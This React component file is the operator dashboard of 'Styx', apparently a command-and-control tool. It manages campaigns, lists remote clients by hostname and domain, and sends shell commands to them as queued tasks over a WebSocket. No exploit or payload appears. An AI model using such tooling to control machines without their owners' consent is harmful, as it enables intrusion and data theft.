import React, { useEffect, useRef, useState } from 'react';
import mark from './mark.svg';
import { CampaignProvider, useCampaign } from './CampaignContext.jsx';
import { FilesView } from './FilesView.jsx';
import { authFetch } from './authFetch.js';

function CampaignPicker() {
  const { campaigns, currentCampaignId, selectCampaign, status, retry } = useCampaign();
  const [creating, setCreating] = useState(false);
  const [name, setName] = useState('');
  const [saving, setSaving] = useState(false);
  const [createError, setCreateError] = useState('');
  const placeholder = status === 'loading' ? 'Loading campaigns…' : status === 'error' ? 'Campaigns unavailable' : campaigns.length ? 'Select a campaign' : 'No campaigns';

  async function createCampaign(event) {
    event.preventDefault();
    const value = name.trim();
    if (!value || saving) return;
    setSaving(true);
    setCreateError('');
    try {
      const response = await authFetch('/rest/campaigns/new', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: value }),
        signal: AbortSignal.timeout(15000),
      });
      if (!response.ok) throw new Error('Could not create campaign. Please try again.');
      setName('');
      setCreating(false);
      retry();
    } catch {
      setCreateError('Could not create campaign. Please try again.');
    } finally {
      setSaving(false);
    }
  }

  return <div className="campaign-picker">
    <label htmlFor="campaign">Campaign</label>
    <select id="campaign" value={currentCampaignId} onChange={event => selectCampaign(event.target.value)} disabled={status === 'loading'}>
      <option value="" disabled={campaigns.length > 0}>{placeholder}</option>
      {campaigns.map(campaign => <option key={campaign.id} value={campaign.id}>{campaign.name}</option>)}
    </select>
    {status === 'ready' && <button className="campaign-create" type="button" aria-expanded={creating} aria-controls="campaign-create-form" onClick={() => { setCreating(value => !value); setCreateError(''); }}>New</button>}
    {creating && status === 'ready' && <form className="campaign-create-form" id="campaign-create-form" onSubmit={createCampaign}>
      <label htmlFor="campaign-name">New campaign</label>
      <input id="campaign-name" value={name} onChange={event => setName(event.target.value)} maxLength={120} autoFocus placeholder="Campaign name" required />
      {createError && <p role="alert">{createError}</p>}
      <div><button type="button" onClick={() => setCreating(false)}>Cancel</button><button type="submit" disabled={saving || !name.trim()}>{saving ? 'Creating…' : 'Create'}</button></div>
    </form>}
    {status === 'error' && <div className="campaign-error" role="status">Could not load campaigns. <button onClick={retry}>Retry</button></div>}
  </div>;
}

function UsersPanel({ onSelectClient, selectedClientId }) {
  const { currentCampaignId, status: campaignStatus } = useCampaign();
  const [clients, setClients] = useState([]);
  const [status, setStatus] = useState('idle');
  const [requestedCampaignId, setRequestedCampaignId] = useState('');
  const [attempt, setAttempt] = useState(0);

  useEffect(() => {
    if (!currentCampaignId) return;
    const controller = new AbortController();
    setClients([]);
    setRequestedCampaignId(currentCampaignId);
    setStatus('loading');
    async function load() {
      try {
        const response = await authFetch(`/rest/clients/list/${encodeURIComponent(currentCampaignId)}`, {
          signal: AbortSignal.any([controller.signal, AbortSignal.timeout(15000)]),
        });
        if (!response.ok) throw new Error('Client request failed');
        const data = await response.json();
        if (!data || (data.clients !== null && !Array.isArray(data.clients))) throw new Error('Invalid client list');
        if (!controller.signal.aborted) {
          setClients(data.clients ?? []);
          setStatus('ready');
        }
      } catch {
        if (!controller.signal.aborted) setStatus('error');
      }
    }
    load();
    return () => controller.abort();
  }, [currentCampaignId, attempt]);

  const displayStatus = currentCampaignId ? requestedCampaignId === currentCampaignId ? status : 'loading' : campaignStatus === 'loading' ? 'loading' : 'idle';
  return <section className="dashboard-panel users-panel" aria-labelledby="users-title">
    <div className="panel-heading">
      <div><h1 id="users-title">Users</h1></div>
      {displayStatus === 'ready' && <span className="panel-count">{clients.length} {clients.length === 1 ? 'client' : 'clients'}</span>}
    </div>
    <div className="users-body">
      {displayStatus === 'idle' && <p className="panel-empty">choose campaign in top right</p>}
      {displayStatus === 'loading' && <p className="panel-empty">Loading clients…</p>}
      {displayStatus === 'error' && <p className="panel-empty">Could not load clients. <button className="text-action" type="button" onClick={() => setAttempt(n => n + 1)}>Retry</button></p>}
      {displayStatus === 'ready' && clients.length === 0 && <p className="panel-empty">No clients in this campaign yet.</p>}
      {displayStatus === 'ready' && clients.length > 0 && <div className="users-table-wrap"><table className="users-table">
        <thead><tr><th>Name</th><th>Client ID</th><th>Hostname</th><th>Domain</th><th>Added</th></tr></thead>
        <tbody>{clients.map((client, index) => <tr key={`${client.client_id}-${index}`} className="user-row" data-selected={client.client_id === selectedClientId} tabIndex={0} title="Double-click to open command panel" onDoubleClick={() => onSelectClient(client)} onKeyDown={event => { if (event.key === 'Enter') onSelectClient(client); }}>
          <td className="user-name">{client.name || '—'}</td>
          <td className="mono">{client.client_id ?? '—'}</td>
          <td className="mono">{client.hostname || '—'}</td>
          <td>{client.domain || '—'}</td>
          <td>{client.created_at && !Number.isNaN(Date.parse(client.created_at)) ? new Date(client.created_at).toLocaleDateString() : '—'}</td>
        </tr>)}</tbody>
      </table></div>}
    </div>
  </section>;
}

function newSocketId() {
  if (crypto.randomUUID) return crypto.randomUUID();
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return Array.from(bytes, byte => byte.toString(16).padStart(2, '0')).join('');
}

function ShellPanel({ client, onClose }) {
  const { currentCampaignId } = useCampaign();
  const [command, setCommand] = useState('');
  const [entries, setEntries] = useState([]);
  const [connectionStatus, setConnectionStatus] = useState('connecting');
  const outputRef = useRef(null);
  const socketRef = useRef(null);
  const taskRequestsRef = useRef(new Set());
  const tabIdRef = useRef(null);
  if (!tabIdRef.current) tabIdRef.current = newSocketId();

  useEffect(() => {
    const url = new URL('/rest/ws/connect', window.location.href);
    url.searchParams.set('client_id', String(client.client_id));
    url.searchParams.set('tab_id', tabIdRef.current);
    url.protocol = url.protocol === 'https:' ? 'wss:' : 'ws:';
    const controller = new AbortController();
    let socket;
    setConnectionStatus('connecting');

    const onMessage = event => {
      let message;
      try { message = JSON.parse(event.data); } catch { return; }
      if (message.metadata?.tab_id && message.metadata.tab_id !== tabIdRef.current) return;
      if (message.event === 'task.Output') {
        setEntries(previous => [...previous, { id: newSocketId(), command: 'Output', response: String(message.body?.output ?? message.body?.message ?? '') }]);
        return;
      }
    };
    const onClose = () => {
      socketRef.current = null;
      setConnectionStatus(status => status === 'error' ? status : 'closed');
    };

    async function connect() {
      try {
        const response = await authFetch('/rest/campaigns/list', {
          signal: AbortSignal.any([controller.signal, AbortSignal.timeout(15000)]),
        });
        if (!response.ok) throw new Error('Could not authorize the connection');
        if (controller.signal.aborted) return;
        const access = localStorage.getItem('access');
        if (!access) throw new Error('Session required');
        socket = new WebSocket(url, ['styx', `styx.jwt.${access}`]);
        socketRef.current = socket;
        socket.onopen = () => setConnectionStatus('connected');
        socket.onmessage = onMessage;
        socket.onerror = () => setConnectionStatus('error');
        socket.onclose = onClose;
      } catch {
        if (!controller.signal.aborted) setConnectionStatus('error');
      }
    }
    connect();

    return () => {
      controller.abort();
      for (const request of taskRequestsRef.current) request.abort();
      taskRequestsRef.current.clear();
      if (!socket) return;
      socket.onopen = socket.onmessage = socket.onerror = socket.onclose = null;
      if (socketRef.current === socket) socketRef.current = null;
      socket.close();
    };
  }, [client.client_id]);

  useEffect(() => {
    if (outputRef.current) outputRef.current.scrollTop = outputRef.current.scrollHeight;
  }, [entries]);
  async function submit(event) {
    event.preventDefault();
    const value = command.trim();
    if (!value) return;
    const [cmd, ...args] = value.split(/\s+/);
    const entryId = newSocketId();
    const controller = new AbortController();
    taskRequestsRef.current.add(controller);
    setEntries(previous => [...previous, { id: entryId, command: value, response: 'Creating task…' }]);
    setCommand('');
    let result;
    try {
      const response = await authFetch('/rest/tasks/new', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd, args: args.map(arg => ({ type: 'string', value: arg })), client_id: client.client_id, campaign_id: currentCampaignId }),
        signal: AbortSignal.any([controller.signal, AbortSignal.timeout(15000)]),
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data?.error || 'Could not create task.');
      if (!Number.isInteger(data?.task_id) || data.task_id <= 0) throw new Error('Invalid task response.');
      result = `Task queued (ID ${data.task_id}).`;
    } catch (error) {
      result = error instanceof Error && error.name !== 'TimeoutError' && error.name !== 'AbortError'
        ? error.message : 'Could not create task. Please try again.';
    } finally {
      taskRequestsRef.current.delete(controller);
    }
    if (!controller.signal.aborted) {
      setEntries(previous => previous.map(entry => entry.id === entryId ? { ...entry, response: result } : entry));
    }
  }
  return <section className="dashboard-panel shell-panel" aria-label="Shell">
    <div className="shell-context"><span>{client.name || client.hostname || `Client ${client.client_id}`}</span><span className="shell-connection" role="status">{connectionStatus === 'connecting' ? 'Connecting…' : connectionStatus === 'connected' ? 'Connected' : connectionStatus === 'error' ? 'Connection failed' : 'Disconnected'}</span><button type="button" onClick={onClose} aria-label="Close command panel">Close</button></div>
    <div className="shell-output" ref={outputRef} role="log" aria-live="polite" aria-label="Shell output">
      {entries.length === 0 && <p className="shell-placeholder">Command output will appear here.</p>}
      {entries.map(entry => <div className="shell-entry" key={entry.id}>
        <div><span className="shell-prompt" aria-hidden="true">$</span> {entry.command}</div>
        <p>{entry.response}</p>
      </div>)}
    </div>
    <form className="shell-form" onSubmit={submit}>
      <div className="shell-input-row"><span aria-hidden="true">$</span><input id="shell-command" aria-label="Command" value={command} onChange={event => setCommand(event.target.value)} autoComplete="off" spellCheck={false} placeholder="Enter a command" /><button type="submit" disabled={!command.trim()}>Enter</button></div>
    </form>
  </section>;
}

function DashboardWorkspace() {
  const { currentCampaignId } = useCampaign();
  const [selectedClient, setSelectedClient] = useState(null);
  const [shellShare, setShellShare] = useState(50);
  const [isResizing, setIsResizing] = useState(false);
  const contentRef = useRef(null);
  const resizingRef = useRef(false);
  const activeClient = selectedClient?.campaignId === currentCampaignId ? selectedClient : null;

  useEffect(() => { setSelectedClient(null); }, [currentCampaignId]);

  function resizeAt(clientY) {
    const rect = contentRef.current?.getBoundingClientRect();
    if (!rect || rect.height <= 0) return;
    const minShell = Math.min(140, rect.height * 0.3);
    const maxShell = Math.max(minShell, rect.height - 160);
    const shellHeight = Math.max(minShell, Math.min(maxShell, rect.bottom - clientY));
    setShellShare(shellHeight / rect.height * 100);
  }

  function stopResize(event) {
    if (!resizingRef.current) return;
    resizingRef.current = false;
    setIsResizing(false);
    if (event.currentTarget.hasPointerCapture(event.pointerId)) event.currentTarget.releasePointerCapture(event.pointerId);
  }

  return <main ref={contentRef} className={`dashboard-content${activeClient ? ' has-shell' : ''}${isResizing ? ' is-resizing' : ''}`} style={{ '--shell-share': `${shellShare}%` }} aria-label="Dashboard">
    <UsersPanel selectedClientId={activeClient?.client_id} onSelectClient={client => setSelectedClient({ ...client, campaignId: currentCampaignId })} />
    {activeClient && <>
      <div className="shell-resizer" role="separator" aria-label="Resize command panel" aria-orientation="horizontal" aria-valuemin={15} aria-valuemax={80} aria-valuenow={Math.round(shellShare)} tabIndex={0}
        onPointerDown={event => { event.preventDefault(); resizingRef.current = true; setIsResizing(true); event.currentTarget.setPointerCapture(event.pointerId); resizeAt(event.clientY); }}
        onPointerMove={event => { if (resizingRef.current) resizeAt(event.clientY); }} onPointerUp={stopResize} onPointerCancel={stopResize}
        onKeyDown={event => { if (event.key === 'ArrowUp' || event.key === 'ArrowDown') { event.preventDefault(); setShellShare(value => Math.max(15, Math.min(80, value + (event.key === 'ArrowUp' ? 5 : -5)))); } }} />
      <ShellPanel key={`${currentCampaignId}:${activeClient.client_id}`} client={activeClient} onClose={() => setSelectedClient(null)} />
    </>}
  </main>;
}

function ConfirmCampaignDelete({ campaign, busy, error, onCancel, onConfirm }) {
  const dialogRef = useRef(null);
  useEffect(() => {
    const dialog = dialogRef.current;
    dialog.showModal();
    return () => { if (dialog.open) dialog.close(); };
  }, []);
  return <dialog ref={dialogRef} className="campaign-delete-dialog" aria-labelledby="delete-campaign-title" aria-describedby="delete-campaign-warning" onCancel={event => { if (busy) event.preventDefault(); else onCancel(); }}>
    <h2 id="delete-campaign-title">Delete {campaign.name}?</h2>
    <p id="delete-campaign-warning">Warning: this will delete all related clients and files. Are you sure?</p>
    {error && <p className="delete-error" role="alert">{error}</p>}
    <div className="dialog-actions"><button type="button" autoFocus disabled={busy} onClick={onCancel}>No</button><button className="delete-confirm" type="button" disabled={busy} onClick={onConfirm}>{busy ? 'Deleting…' : 'Yes'}</button></div>
  </dialog>;
}

function CampaignsView() {
  const { campaigns, status, retry } = useCampaign();
  const [target, setTarget] = useState(null);
  const [deleting, setDeleting] = useState(false);
  const [deleteError, setDeleteError] = useState('');

  async function confirmDelete() {
    if (!target || deleting) return;
    setDeleting(true);
    setDeleteError('');
    try {
      const response = await authFetch(`/rest/campaigns/delete/${encodeURIComponent(target.id)}`, {
        method: 'POST',
        signal: AbortSignal.timeout(15000),
      });
      if (!response.ok) throw new Error('Could not delete campaign. Please try again.');
      setTarget(null);
      retry();
    } catch {
      setDeleteError('Could not delete campaign. Please try again.');
    } finally {
      setDeleting(false);
    }
  }

  return <main className="campaigns-view" aria-labelledby="campaigns-title">
    <header className="campaigns-heading"><h1 id="campaigns-title">Campaigns</h1>{status === 'ready' && <span>{campaigns.length} {campaigns.length === 1 ? 'campaign' : 'campaigns'}</span>}</header>
    {status === 'loading' && <p className="campaigns-message">Loading campaigns…</p>}
    {status === 'error' && <p className="campaigns-message">Could not load campaigns. <button className="text-action" type="button" onClick={retry}>Retry</button></p>}
    {status === 'ready' && campaigns.length === 0 && <p className="campaigns-message">No campaigns yet. Use New in the top right to create one.</p>}
    {status === 'ready' && campaigns.length > 0 && <table className="campaigns-table">
      <thead><tr><th>Name</th><th>Clients</th><th>Files</th><th>Created at</th><th><span className="sr-only">Actions</span></th></tr></thead>
      <tbody>{campaigns.map(campaign => <tr key={campaign.id}>
        <td className="campaign-name">{campaign.name}</td>
        <td className="campaign-number">{campaign.total_clients ?? '—'}</td>
        <td className="campaign-number">{campaign.total_files ?? '—'}</td>
        <td>{campaign.created_at && !Number.isNaN(Date.parse(campaign.created_at)) ? new Date(campaign.created_at).toLocaleString() : '—'}</td>
        <td className="campaign-actions"><button type="button" onClick={() => { setDeleteError(''); setTarget(campaign); }}>Delete</button></td>
      </tr>)}</tbody>
    </table>}
    {target && <ConfirmCampaignDelete campaign={target} busy={deleting} error={deleteError} onCancel={() => setTarget(null)} onConfirm={confirmDelete} />}
  </main>;
}

export function Dashboard() {
  const [view, setView] = useState('dashboard');
  return <CampaignProvider>
    <div className="dashboard-shell">
      <header className="dashboard-topbar">
        <a className="brand" href="/dashboard" aria-label="Styx home"><img src={mark} alt="" width="30" height="30" /><span>styx</span></a>
        <nav className="top-nav" aria-label="Main navigation">
          <button className="nav-item" type="button" onClick={() => setView('dashboard')} aria-current={view === 'dashboard' ? 'page' : undefined}>Dashboard</button>
          <button className="nav-item" type="button" onClick={() => setView('campaigns')} aria-current={view === 'campaigns' ? 'page' : undefined}>Campaigns</button>
          <button className="nav-item" type="button" onClick={() => setView('files')} aria-current={view === 'files' ? 'page' : undefined}>Files</button>
          {['Builder', 'Settings'].map(name => <button className="nav-item" key={name} disabled title={`${name} is coming soon`}>{name}</button>)}
        </nav>
        <CampaignPicker />
      </header>
      {view === 'dashboard' ? <DashboardWorkspace /> : view === 'campaigns' ? <CampaignsView /> : <FilesView />}
    </div>
  </CampaignProvider>;
}
